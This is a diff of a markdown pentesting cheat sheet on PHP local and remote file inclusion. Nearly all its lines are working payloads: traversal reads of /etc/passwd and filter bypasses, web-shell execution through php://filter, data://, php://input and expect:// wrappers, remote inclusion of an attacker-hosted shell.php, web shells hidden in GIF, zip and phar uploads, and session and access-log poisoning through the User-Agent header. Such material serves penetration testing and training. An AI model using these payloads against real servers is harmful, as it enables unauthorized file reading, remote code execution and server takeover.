@@ -101,8 +101,8 @@ if(req.query.language) {
 * This trick would work if the whole input was used within the `include()` function without any additions
 * **Common readable files**
   * Linux: `/etc/passwd`
-  * Windows: `C:\Windows\boot.ini`&#x20;
-* **Windows path syntax notes**
+  * Windows: `C:\Windows\boot.ini`
+* **Windows path syntax**
   * Backslash and forward slash both work on Windows/PHP: `..\..\windows\win.ini` and `../../windows/win.ini` are equivalent.
   * UNC paths can also be referenced if the include function resolves them: `\\attacker-ip\share\file.txt`
   * Drive letters can be used directly: `C:\Windows\win.ini` or `C:/Windows/win.ini`
@@ -113,14 +113,14 @@ if(req.query.language) {
 * Source Code: `include("./languages/" . $_GET['language']);`
 * Add `../` before our file name, which refers to the parent directory.
 * Trick would work even if the entire parameter was used in the `include()` function or prefixed with some value.
-* e.g. `../../../../etc/passwd`&#x20;
+* e.g. `../../../../etc/passwd`
 
 #### Filename Prefix <a href="#filename-prefix" id="filename-prefix"></a>
 
 * Some cases wher our input may be appended after a different string
 * Source Code: `include("lang_" . $_GET['language']);`
 * Instead of directly using path traversal, we can prefix a `/` before our payload, and this should consider the prefix as a directory, and then we should bypass the filename and be able to traverse directories
-* eg. `/../../etc/passwd`&#x20;
+* eg. `/../../etc/passwd`
 
 #### Appended Extensions <a href="#appended-extensions" id="appended-extensions"></a>
 
@@ -137,27 +137,27 @@ if(req.query.language) {
 
 * #### Non-Recursive Path Traversal Filters <a href="#non-recursive-path-traversal-filters" id="non-recursive-path-traversal-filters"></a>
   * Basic filters against LFI is a search and replace filter, where it simply deletes substrings of (../) to avoid path traversals.
-  * `$language = str_replace('../', '', $_GET['language']);`  <sup><sub>(source-code)<sub></sup>
+  * `$language = str_replace('../', '', $_GET['language']);` <sup><sub>(source-code)<sub></sup>
   * **Bypasses**: `..././`, `....////`, `....//` , `....\/` , `.?/.*/.?/etc/passwd`
 * #### Encoding <a href="#encoding" id="encoding"></a>
   * Web filters may prevent input filters that include certain LFI-related characters, like a dot `.` or a slash `/` used for path traversals.
   * Filters may be bypassed by URL encoding our input, such that it would no longer include these bad characters.
-  * Byapss: `%2e%2e%2f`&#x20;
+  * Byapss: `%2e%2e%2f`
 * #### Approved Paths <a href="#approved-paths" id="approved-paths"></a>
   * Web applications may also use Regular Expressions to ensure that the file being included is under a specific path.
   * `if(preg_match('/^./languages/.+$/', $_GET['language'])) { include($_GET['language']); } else { echo 'Illegal path specified!'; }` <sup><sub>(source-code)<sub></sup>
   * To find the approved path, we can examine the requests sent by the existing forms, and see what path they use for the normal web functionality.
-  * Bypass: `allowed-path/../../../etc/passwd`&#x20;
+  * Bypass: `allowed-path/../../../etc/passwd`
 * #### Appended Extension <a href="#appended-extension" id="appended-extension"></a>
   * Web applications append an extension to our input string (e.g. `.php`), to ensure that the file we include is in the expected extension.
   * Obsolete with modern versions of PHP and only work with PHP versions before 5.3/5.4
   * **Path Truncation**
     * In earlier versions of PHP, defined strings have a maximum length of 4096 characters, likely due to the limitation of 32-bit systems.
     * PHP also used to remove trailing slashes and single dots in path names, so if we call (`/etc/passwd/.`) then the `/.` would also be truncated, and PHP would call (`/etc/passwd`).
-    * PHP, and Linux systems in general, also disregard multiple slashes in the path (e.g. `////etc/passwd` is the same as `/etc/passwd`).&#x20;
+    * PHP, and Linux systems in general, also disregard multiple slashes in the path (e.g. `////etc/passwd` is the same as `/etc/passwd`).
     * Similarly, a current directory shortcut (`.`) in the middle of the path would also be disregarded (e.g. `/etc/./passwd`).
-    * **Bypass:** `?language=non_existing_directory/../../../etc/passwd/./././././ REPEATED ~2048 times]`&#x20;
-    * `echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done non_existing_directory/../../../etc/passwd/./././././././`&#x20;
+    * **Bypass:** `?language=non_existing_directory/../../../etc/passwd/./././././ REPEATED ~2048 times]`
+    * `echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done non_existing_directory/../../../etc/passwd/./././././././`
   * **Null Bytes**
     * PHP versions before 5.5 were vulnerable to `null byte injection`, which means that adding a null byte (`%00`) at the end of the string would terminate the string.
     * **Bypass**: `/etc/passwd%00`
@@ -169,36 +169,36 @@ if(req.query.language) {
 * #### Input Filters Wrapper <a href="#input-filters" id="input-filters"></a>
   * [PHP Filters](https://www.php.net/manual/en/filters.php) allow us to transform stream data by applying specific filters during stream operations.
   * To access the PHP filter wrapper with `php://filter/` to apply filters to a resource.
-  * The `filter` wrapper has several parameters, but the main ones we require for our attack are `resource` and `read`.&#x20;
+  * The `filter` wrapper has several parameters, but the main ones we require for our attack are `resource` and `read`.
   * Read parameter has four different types of filters available for use, which are [String Filters](https://www.php.net/manual/en/filters.string.php), [Conversion Filters](https://www.php.net/manual/en/filters.convert.php), [Compression Filters](https://www.php.net/manual/en/filters.compression.php), and [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php)
-  * Fuzzing for PHP Files :  `ffuf -w directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:/FUZZ.php`&#x20;
-  * **Payload**: `php://filter/read=convert.base64-encode/resource=config`&#x20;
-  * eg: `http://<SERVER_IP>:/index.php?language=php://filter/read=convert.base64-encode/resource=config`&#x20;
+  * Fuzzing for PHP Files : `ffuf -w directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:/FUZZ.php`
+  * **Payload**: `php://filter/read=convert.base64-encode/resource=config`
+  * eg: `http://<SERVER_IP>:/index.php?language=php://filter/read=convert.base64-encode/resource=config`
 * #### Data Wrapper <a href="#data" id="data"></a>
   * Used to include external data, including PHP code.
   * Data wrapper is only available to use if the (`allow_url_include`) setting is enabled in the PHP configurations.
   * PHP configuration file found at (`/etc/php/X.Y/apache2/php.ini`) for Apache or at (`/etc/php/X.Y/fpm/php.ini`) for Nginx, where `X.Y` is your install PHP version.
-  * eg: `php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini`&#x20;
+  * eg: `php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini`
   * **Payloads**
-    * `echo '<?php system($_GET["cmd"]); ?>' | base64`&#x20;
-    * `data://text/plain;base64,=<base64-value>&cmd=id`&#x20;
-    * eg: `curl -s 'http://<SERVER_IP>:/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id'`&#x20;
+    * `echo '<?php system($_GET["cmd"]); ?>' | base64`
+    * `data://text/plain;base64,=<base64-value>&cmd=id`
+    * eg: `curl -s 'http://<SERVER_IP>:/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id'`
 * #### Input Wrapper <a href="#input" id="input"></a>
   * The [input](https://www.php.net/manual/en/wrappers.php.php) wrapper can be used to include external input and execute PHP code.
   * The difference between it and the `data` wrapper is that we pass our input to the `input` wrapper as a POST request's data.
   * So, the vulnerable parameter must accept POST requests for this attack to work.
-  * &#x20;The `input` wrapper also depends on the `allow_url_include` .
+  * The `input` wrapper also depends on the `allow_url_include` .
   * PHP configuration file found at (`/etc/php/X.Y/apache2/php.ini`) for Apache or at (`/etc/php/X.Y/fpm/php.ini`) for Nginx, where `X.Y` is your install PHP version.
-  * **Payload**: `curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:/index.php?language=php://input&cmd=id" | grep uid`&#x20;
+  * **Payload**: `curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:/index.php?language=php://input&cmd=id" | grep uid`
   * To pass our command as a GET request, we need the vulnerable function to also accept GET request (i.e. use `$_REQUEST`). If it only accepts POST requests, then we can put our command directly in our PHP code, instead of a dynamic web shell (e.g. `<\?php system('id')?>`)
   * #### Expect Wrapper <a href="#expect" id="expect"></a>
-    * The [expect](https://www.php.net/manual/en/wrappers.expect.php) wrapper allows us to directly run commands through URL streams.&#x20;
+    * The [expect](https://www.php.net/manual/en/wrappers.expect.php) wrapper allows us to directly run commands through URL streams.
     * Expect works very similarly to the web shells we've used earlier, but don't need to provide a web shell, as it is designed to execute commands.
     * However, `expect` is an external wrapper, so it needs to be manually installed and enabled on the back-end server, though some web apps rely on it for their core functionality.
     * PHP configuration file found at (`/etc/php/X.Y/apache2/php.ini`) for Apache or at (`/etc/php/X.Y/fpm/php.ini`) for Nginx, where `X.Y` is your install PHP version.
-    * **Syntax**: `extension=expect`&#x20;
+    * **Syntax**: `extension=expect`
     * **Payload**: `expect://id`
-    * eg:  `curl -s "http://<SERVER_IP>:/index.php?language=expect://id"`
+    * eg: `curl -s "http://<SERVER_IP>:/index.php?language=expect://id"`
 
 ## Remote File Inclusion (RFI) <a href="#remote-file-inclusion-rfi" id="remote-file-inclusion-rfi"></a>
 
@@ -212,19 +212,19 @@ if(req.query.language) {
 * Any remote URL inclusion in PHP would require the `allow_url_include` setting to be enabled
 * PHP configuration file found at (`/etc/php/X.Y/apache2/php.ini`) for Apache or at (`/etc/php/X.Y/fpm/php.ini`) for Nginx, where `X.Y` is your install PHP version.
 * More reliable way to determine whether an LFI vulnerability is also vulnerable to RFI is to `try and include a URL`, and see if we can get its content.
-* eg: `http://127.0.0.1:80/index.php`  and other remote URL's
+* eg: `http://127.0.0.1:80/index.php` and other remote URL's
 
 ### Remote Code Execution <a href="#remote-code-execution-with-rfi" id="remote-code-execution-with-rfi"></a>
 
 * Create a malicious script in the language of the web application.
-* eg: `echo '<?php system($_GET["cmd"]); ?>' > shell.php`&#x20;
+* eg: `echo '<?php system($_GET["cmd"]); ?>' > shell.php`
 * Host this script and include it through the RFI vulnerability
   * **HTTP**
-    * `sudo python3 -m http.server <PORT>`&#x20;
+    * `sudo python3 -m http.server <PORT>`
     * **Payload**: `http://<SERVER_IP>:/index.php?language=http://<OUR_IP>:<PORT>/shell.php&cmd=id`
   * **FTP**
-    * `sudo python -m pyftpdlib -p 21`&#x20;
-    * **Payload**: `http://<SERVER_IP>:/index.php?language=ftp://<OUR_IP>/shell.php&cmd=id`&#x20;
+    * `sudo python -m pyftpdlib -p 21`
+    * **Payload**: `http://<SERVER_IP>:/index.php?language=ftp://<OUR_IP>/shell.php&cmd=id`
   * **SMB** <sup><sub>(windows server)<sub></sup>
     * `impacket-smbserver -smb2support share $(pwd)` <sup><sub>(anonymous authentication)<sub></sup>
     * **Payload:** `http://<SERVER_IP>:/index.php?language=\<OUR_IP>\share\shell.php&cmd=whoami`
@@ -234,16 +234,16 @@ if(req.query.language) {
 * If the vulnerable function has code `Execute` capabilities, then the code within the file we upload will get executed if we include it, regardless of the file extension or file type.
 * For example, we can upload an image file (e.g. `image.jpg`), and store a PHP web shell code within it 'instead of image data', and if we include it through the LFI vulnerability, the PHP code will get executed and we will have remote code execution.
 * #### Crafting Malicious Image
-  * Create a malicious image containing a PHP web shell code that still looks and works as an image.&#x20;
+  * Create a malicious image containing a PHP web shell code that still looks and works as an image.
   * Use an allowed image extension in our file name (e.g. `shell.gif`), and include the image magic bytes at the beginning of the file content (e.g. `GIF8`)
-  * **Payload**: `echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif`&#x20;
+  * **Payload**: `echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif`
   * This file on its own is completely harmless and would not affect normal web applications in the slightest.
   * If we combine it with an LFI vulnerability, then we may be able to reach remote code execution.
 * #### Zip Upload <a href="#zip-upload" id="zip-upload"></a>
   * We can utilize the [zip](https://www.php.net/manual/en/wrappers.compression.php) wrapper to execute PHP code.
   * Create a PHP web shell script and zipping it into a zip archive (named `shell.jpg`)
-  * **Payload**: `echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php`&#x20;
-  * **LFI Payload**: `http://<SERVER_IP>:/index.php?language=`**`zip://./profile_images/shell.jpg%23shell.php&cmd=id`**&#x20;
+  * **Payload**: `echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php`
+  * **LFI Payload**: `http://<SERVER_IP>:/index.php?language=`**`zip://./profile_images/shell.jpg%23shell.php&cmd=id`**
 * #### Phar Upload <a href="#phar-upload" id="phar-upload"></a>
   * We can use the `phar://` wrapper to achieve a similar result.
   * <pre class="language-php" data-line-numbers><code class="lang-php">## Save as shell.php
@@ -256,13 +256,13 @@ if(req.query.language) {
     $phar->stopBuffering();
     ## This script can be compiled into a phar file that when called would write a web shell to a shell.txt sub-file, which we can interact with.
     </code></pre>
-  * We can compile it into a `phar` file and rename it to `shell.jpg`&#x20;
+  * We can compile it into a `phar` file and rename it to `shell.jpg`
   * **Payload**: `php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg`
-  * **LFI Payload**: `http://<SERVER_IP>:/index.php?language=`**`phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id`**&#x20;
+  * **LFI Payload**: `http://<SERVER_IP>:/index.php?language=`**`phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id`**
 
 ## Log Poisoning <a href="#log-poisoning" id="log-poisoning"></a>
 
-* Writing PHP code in a field we control that gets logged into a log file (i.e. `poison`/`contaminate` the log file), and then include that log file to execute the PHP code.&#x20;
+* Writing PHP code in a field we control that gets logged into a log file (i.e. `poison`/`contaminate` the log file), and then include that log file to execute the PHP code.
 * For this attack to work, the PHP web application should have read privileges over the logged files
 
 ### PHP Session Poisoning <a href="#php-session-poisoning" id="php-session-poisoning"></a>
@@ -270,13 +270,13 @@ if(req.query.language) {
 * Applications utilize `PHPSESSID` cookies, which hold specific user-related data on the back-end, so the web application can keep track of user details.
 * Details are stored in `session` files on the back-end, and saved in `/var/lib/php/sessions/` on Linux and in `C:\Windows\Temp\` on Windows.
 * Name of the file that contains our user's data matches the name of our `PHPSESSID` cookie with the `sess_` prefix.
-* **Verify files exist**: `http://<SERVER_IP>:/index.php?language=`**`/var/lib/php/sessions/sess_<cookie-value>`**&#x20;
+* **Verify files exist**: `http://<SERVER_IP>:/index.php?language=`**`/var/lib/php/sessions/sess_<cookie-value>`**
 * Analyze the file contents to obtain the parameters we can control for poisoning. <sup><sub>(may not be same name, we will need to corelate)<sub></sup>
 * Poison that parameter by adding a canary value.
-  * `http://<SERVER_IP>:/index.php?language=session_poisoning`&#x20;
-  * `http://<SERVER_IP>:/index.php?language=`**`/var/lib/php/sessions/sess_<cookie-value>`**  <sup><sub>(verify if the poisoned value is reflected or not)<sub></sup>
-* **Poison Payload**: `http://<SERVER_IP>:/index.php?language=`**`<?php system($_GET["cmd"]);?>`**&#x20;
-* **Render Payload:** `http://<SERVER_IP>:/index.php?language=`**`/var/lib/php/sessions/sess_<cookie-value>&cmd=id`**&#x20;
+  * `http://<SERVER_IP>:/index.php?language=session_poisoning`
+  * `http://<SERVER_IP>:/index.php?language=`**`/var/lib/php/sessions/sess_<cookie-value>`** <sup><sub>(verify if the poisoned value is reflected or not)<sub></sup>
+* **Poison Payload**: `http://<SERVER_IP>:/index.php?language=`**`<?php system($_GET["cmd"]);?>`**
+* **Render Payload:** `http://<SERVER_IP>:/index.php?language=`**`/var/lib/php/sessions/sess_<cookie-value>&cmd=id`**
 * **Note:** To execute another command, the session file has to be poisoned with the web shell again, as it gets overwritten with `/var/lib/php/sessions/sess_<cookie-value>` after our last inclusion.
 
 ### Server Log Poisoning <a href="#server-log-poisoning" id="server-log-poisoning"></a>
@@ -290,8 +290,8 @@ if(req.query.language) {
 * However, the logs may be in a different location in some cases, so we may use an [LFI Wordlist](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI) to fuzz for their locations.
 * **Read Log File**: `http://<SERVER_IP>:/index.php?language=`**`/var/log/apache2/access.log`**
 * Analayze the parameter that is user-controllable.
-* We will use `Burp Suite` to intercept our earlier LFI request and modify the `User-Agent`&#x20;
-* **Payload**: `User-Agent:`` `**`<?php system($_GET['cmd']); ?>`**&#x20;
+* We will use `Burp Suite` to intercept our earlier LFI request and modify the `User-Agent`
+* **Payload**: ` User-Agent:`` `` `**`<?php system($_GET['cmd']); ?>`**
 * ```shellscript
   echo -n "User-Agent: <?php system(\$_GET['cmd']); ?>" > Poison
   curl -s "http://<SERVER_IP>:<PORT>/index.php" -H @Poison
@@ -303,10 +303,10 @@ if(req.query.language) {
 
 ### Fuzzing Parameters <a href="#fuzzing-parameters" id="fuzzing-parameters"></a>
 
-* HTML forms users can use on web front-end tend to be properly tested and well secured against different web attacks.&#x20;
+* HTML forms users can use on web front-end tend to be properly tested and well secured against different web attacks.
 * However, the page may have other exposed parameters that are not linked to any HTML forms, and hence normal users would never access. This is why it may be important to fuzz for exposed parameters, as they tend not to be as secure as public ones.
 * [hacktricks-file-inclusion#top-25-parameters](https://hacktricks.wiki/en/pentesting-web/file-inclusion/index.html#top-25-parameters)
-* eg: `ffuf -w burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:/index.php?FUZZ=value'`&#x20;
+* eg: `ffuf -w burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:/index.php?FUZZ=value'`
 
 ### Fuzzing LFI Payloads <a href="#lfi-wordlists" id="lfi-wordlists"></a>
 
@@ -317,12 +317,12 @@ if(req.query.language) {
 * #### Server Webroot
   * If we wanted to locate a file we uploaded, but cannot reach its `/uploads` directory through relative paths (e.g. `../../uploads`). In such cases, we need to figure out the server webroot path so that we can locate our uploaded files through absolute paths instead of relative paths.
   * We can fuzz for the `index.php` file through common webroot paths, which we can find in this [SecLists-default-web-root-directory-linux.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt) or this [SecLists-default-web-root-directory-windows.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt). Depending on our LFI situation, we may need to add a few back directories (e.g. `../../../../`), and then add our `index.php` afterwards.
-  * eg: `ffuf -w /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:/index.php?language=../../../../FUZZ/index.php' -fs 2287`&#x20;
+  * eg: `ffuf -w /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:/index.php?language=../../../../FUZZ/index.php' -fs 2287`
 * #### Server Logs/Configurations
-  * We need to identify the correct logs directory to be able to perform the log poisoning attacks we discussed.&#x20;
+  * We need to identify the correct logs directory to be able to perform the log poisoning attacks we discussed.
   * We also need to read the server configurations to be able to identify the server webroot path and other important information.
   * We may use the [LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt) wordlist, as it contains many of the server logs and configuration paths. If we wanted a more precise scan, we can use [DragonJAR-LFI-WordList-Linux](https://github.com/DragonJAR/Security-Wordlist/blob/main/LFI-WordList-Linux) or [DragonJAR-LFI-WordList-Windows](https://github.com/DragonJAR/Security-Wordlist/blob/main/LFI-WordList-Windows)
-  * eg: `ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:/index.php?language=../../../../FUZZ' -fs 2287`&#x20;
+  * eg: `ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:/index.php?language=../../../../FUZZ' -fs 2287`
 
 ### LFI Tools <a href="#lfi-tools" id="lfi-tools"></a>
 
@@ -333,4 +333,3 @@ if(req.query.language) {
 ## References
 
 * [hacktricks.wiki-lfi2rce-via-phpinfo()](https://hacktricks.wiki/en/pentesting-web/file-inclusion/lfi2rce-via-phpinfo.html)
-
